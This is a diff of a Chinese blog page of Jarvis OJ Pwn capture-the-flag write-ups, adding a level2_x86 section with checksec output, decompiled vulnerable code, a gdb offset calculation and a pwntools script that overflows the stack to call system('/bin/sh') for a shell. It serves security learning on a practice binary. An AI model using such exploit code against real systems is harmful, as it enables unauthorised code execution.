@@ -46,7 +46,7 @@
 
 
 ">
-    <meta name="keywords" content="null,Pwn,writeup,Jarvis OJ,栈溢出">
+    <meta name="keywords" content="null,Pwn,Jarvis OJ,栈溢出,writeup">
 
     <!-- Site Verification -->
     
@@ -88,11 +88,11 @@
 
 
 ">
-    <meta property="og:article:tag" content="Pwn"> <meta property="og:article:tag" content="writeup"> <meta property="og:article:tag" content="Jarvis OJ"> <meta property="og:article:tag" content="栈溢出"> 
+    <meta property="og:article:tag" content="Pwn"> <meta property="og:article:tag" content="Jarvis OJ"> <meta property="og:article:tag" content="栈溢出"> <meta property="og:article:tag" content="writeup"> 
 
     
         <meta property="article:published_time" content="3月 21, 2018" />
-        <meta property="article:modified_time" content="6月 09, 2018" />
+        <meta property="article:modified_time" content="7月 01, 2018" />
     
 
     <!-- The Twitter Card protocol -->
@@ -143,7 +143,7 @@
     "headline": "Jarvis OJ Pwn writeup",
     "url": "http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/index.html",
     "datePublished": "3月 21, 2018",
-    "dateModified": "6月 09, 2018",
+    "dateModified": "7月 01, 2018",
     "description": "此篇记录关于Jarvis OJ Pwn所有题目的writeup
 [XMAN]level0进行chack
 [*] &amp;#39;/home/ios/Desktop/pwn0&amp;#39;
@@ -383,7 +383,7 @@
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XMAN-level0"><span class="post-toc-number">1.</span> <span class="post-toc-text">[XMAN]level0</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#进行chack"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">进行chack</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#附件拖入ida"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">附件拖入ida</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#跟进"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">跟进</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><span class="post-toc-number">1.0.4.</span> <span class="post-toc-text">查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#编写exp"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">编写exp</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#运行结果"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">运行结果</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Tell-Me-Something"><span class="post-toc-number">2.</span> <span class="post-toc-text">Tell Me Something</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#先进行check"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">先进行check</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IDA分析程序"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">IDA分析程序</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路很简单-简单栈溢出并且覆盖ret为good-game地址即可"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">思路很简单 简单栈溢出并且覆盖ret为good_game地址即可</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#good-game-地址："><span class="post-toc-number">2.4.</span> <span class="post-toc-text">good_game 地址：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#GDB调试找到溢出偏移"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">GDB调试找到溢出偏移</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EXP"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">EXP</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level1"><span class="post-toc-number">3.</span> <span class="post-toc-text">level1</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#XMAN-level0"><span class="post-toc-number">1.</span> <span class="post-toc-text">[XMAN]level0</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#进行chack"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">进行chack</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#附件拖入ida"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">附件拖入ida</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#跟进"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">跟进</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#查看函数窗口-找到callsystem-查看代码发现已经写好了shell"><span class="post-toc-number">1.0.4.</span> <span class="post-toc-text">查看函数窗口 找到callsystem() 查看代码发现已经写好了shell</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#编写exp"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">编写exp</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#运行结果"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">运行结果</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Tell-Me-Something"><span class="post-toc-number">2.</span> <span class="post-toc-text">Tell Me Something</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#先进行check"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">先进行check</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#IDA分析程序"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">IDA分析程序</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路很简单-简单栈溢出并且覆盖ret为good-game地址即可"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">思路很简单 简单栈溢出并且覆盖ret为good_game地址即可</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#good-game-地址："><span class="post-toc-number">2.4.</span> <span class="post-toc-text">good_game 地址：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#GDB调试找到溢出偏移"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">GDB调试找到溢出偏移</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EXP"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">EXP</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level1"><span class="post-toc-number">3.</span> <span class="post-toc-text">level1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level2-x86"><span class="post-toc-number">4.</span> <span class="post-toc-text">level2_x86</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#方法一"><span class="post-toc-number">4.0.1.</span> <span class="post-toc-text">方法一</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#方法二"><span class="post-toc-number">4.0.1.1.</span> <span class="post-toc-text">方法二</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp编写"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">exp编写</span></a></li></ol></li></ol>
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -734,6 +734,82 @@ p.sendline(payload)
 
 p.interactive()
 </code></pre><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/7.jpg" alt="ida1"><br>成功拿到shell </p>
+<h2 id="level2-x86"><a href="#level2-x86" class="headerlink" title="level2_x86"></a>level2_x86</h2><p>检查保护</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec level2x86
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/level2x86'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+</code></pre>
+<p>载入IDA分析程序</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo 'Hello World!'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>main函数主要调用system函数输出 然后调用vulnerable_function()函数 我们跟进看一下</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-88h]</span>
+
+  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo Input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>read()函数这里限制了读入buf的长度0x100</p>
+<p>  但是 我们这里利用并不会受到影响</p>
+<p>shift+F12尝试搜索程序是否自带shell</p>
+<p>因为程序需要调用system函数 所以可以找到system.plt地址</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>查看IDA中函数调用窗口找到system.plt_addr</p>
+<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/8.jpg" alt="8"></p>
+<p>找到地址0x8048320</p>
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>利用pwntools获取</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level2x86'</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level2x86'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#system =0x8048320</span>
+
+system <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+</code></pre>
+<p>即可获取</p>
+<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-88h]</span>
+</code></pre>
+<p>计算偏移 ret到buf的距离为 ebp+0x4-（ebp-88h）</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/d 0x4+0x88
+<span class="token variable">$1</span> <span class="token operator">=</span> 140
+gdb-peda$
+</code></pre>
+<p>所以偏移为140</p>
+<p>思路：我们溢出覆盖到ret为system地址应为压栈顺序所以先伪造system(‘bin/sh’)的返回地址(任意地址)接着传入bin/sh_addr</p>
+<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/9.jpg" alt="9"></p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true">#p = process('./level2x86')</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level2x86'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#system =0x8048320</span>
+
+system <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+sh <span class="token operator">=</span><span class="token number">0x804A024</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">140</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1553155</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>尝试远程获取shell</p>
+<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/10.jpg" alt="10"></p>
 
     
 
@@ -859,7 +935,7 @@ p.interactive()
             </a>
             <ul class="dropdown-menu">
             <li>
-                <a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
+                <a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
             </ul>
         </li>
         
